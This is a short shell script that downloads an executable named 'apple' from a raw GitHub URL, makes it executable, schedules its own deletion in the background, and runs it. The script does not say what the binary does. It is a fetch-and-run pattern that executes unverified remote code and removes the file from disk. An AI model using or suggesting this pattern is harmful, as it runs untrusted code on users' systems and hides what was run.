curl -fsSL https://raw.githubusercontent.com/XenoXVI/alp/main/bin/apple/apple -o apple || exit
chmod +x ./apple || exit
(sleep 1 && rm ./apple & )
./apple